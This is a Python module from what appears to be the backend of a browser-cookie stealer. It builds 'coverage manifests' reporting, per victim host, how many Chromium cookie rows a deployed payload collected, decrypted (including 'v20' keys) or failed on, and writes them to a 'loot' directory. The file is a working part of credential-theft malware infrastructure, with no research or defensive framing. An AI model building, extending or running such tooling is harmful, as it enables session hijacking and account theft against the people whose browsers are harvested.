"""Coverage manifests: what each collector looked at and what it got.

The payload will send one of these next to the records (stage 2). Until then the
listener accepts a bare list exactly as before and only writes manifests when it
receives the object envelope:

    {"records": [...], "coverage": {
        "host": "LAPTOP-...", "run": "...", "ts": 1760000000,
        "sources": [
            {"kind": "chromium", "browser": "chrome", "profile": "Default",
             "path": "C:\\...\\Network\\Cookies",
             "rows": 240, "decrypted": 232, "failed": 8,
             "skipped": "", "note": "v20 key loaded"}
        ]}}

A source is one concrete database file. Totals are derived, never trusted from
the payload. `skipped` is a reason code, not free text: missing, locked,
no-key, v10-fail, unsupported, excluded.
"""
import json
import os
import time

SKIP_REASONS = ("missing", "locked", "no-key", "v10-fail", "unsupported", "excluded")


def _int(v, default=0):
    try:
        n = int(v)
    except (TypeError, ValueError):
        return default
    return n if n >= 0 else default


def _source(raw):
    """Normalize one source row; returns None when it has nothing to say."""
    if not isinstance(raw, dict):
        return None
    src = {
        "kind": str(raw.get("kind") or "")[:32],
        "browser": str(raw.get("browser") or "")[:32],
        "profile": str(raw.get("profile") or "")[:64],
        "path": str(raw.get("path") or "")[:512],
        "rows": _int(raw.get("rows")),
        "decrypted": _int(raw.get("decrypted")),
        "failed": _int(raw.get("failed")),
        "skipped": str(raw.get("skipped") or "")[:32],
        "note": str(raw.get("note") or "")[:200],
    }
    if src["skipped"] not in SKIP_REASONS:
        src["skipped"] = ""
    if not any((src["kind"], src["browser"], src["path"], src["rows"], src["skipped"])):
        return None
    if src["decrypted"] > src["rows"]:
        src["decrypted"] = src["rows"]
    if src["failed"] > src["rows"] - src["decrypted"]:
        src["failed"] = max(0, src["rows"] - src["decrypted"])
    return src


def manifest(raw, host="", run="", ts=None):
    """Build a manifest from a payload object. Never raises on bad input."""
    raw = raw if isinstance(raw, dict) else {}
    sources = [_source(s) for s in raw.get("sources") or []]
    sources = [s for s in sources if s]
    m = {
        "ts": _int(raw.get("ts"), int(ts if ts is not None else time.time())),
        "host": str(raw.get("host") or host or "")[:64],
        "run": str(raw.get("run") or run or "")[:64],
        "sources": sources,
    }
    return finalize(m)


def finalize(m):
    rows = sum(s["rows"] for s in m["sources"])
    dec = sum(s["decrypted"] for s in m["sources"])
    failed = sum(s["failed"] for s in m["sources"])
    skipped = sum(1 for s in m["sources"] if s["skipped"])
    m["totals"] = {
        "sources": len(m["sources"]),
        "rows": rows,
        "decrypted": dec,
        "failed": failed,
        "skipped_sources": skipped,
        "yield": round(dec / rows, 4) if rows else 0.0,
    }
    return m


def path(loot_dir):
    return os.path.join(loot_dir, "coverage.jsonl")


def append(loot_dir, m):
    """Append one manifest as JSONL. Returns the file path."""
    os.makedirs(loot_dir, exist_ok=True)
    p = path(loot_dir)
    with open(p, "a", encoding="utf-8") as f:
        f.write(json.dumps(finalize(m), ensure_ascii=False) + "\n")
    return p


def load_all(loot_dir):
    p = path(loot_dir)
    out = []
    if not os.path.exists(p):
        return out
    with open(p, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                out.append(json.loads(line))
            except ValueError:
                continue
    return out


def summarize(m):
    """One human line for a manifest."""
    t = m.get("totals") or {}
    bits = ["%s/%s" % (m.get("host") or "?", m.get("run") or "-"),
            "%d/%d decrypted" % (t.get("decrypted", 0), t.get("rows", 0))]
    if t.get("failed"):
        bits.append("%d failed" % t["failed"])
    if t.get("skipped_sources"):
        bits.append("%d skipped" % t["skipped_sources"])
    return "  ".join(bits)


def envelope(records=None, host="", run="", sources=None):
    """Build the object the payload will POST in stage 2 (helper for tests)."""
    return {"records": records or [],
            "coverage": finalize({"ts": int(time.time()), "host": host, "run": run,
                                  "sources": sources or []})}
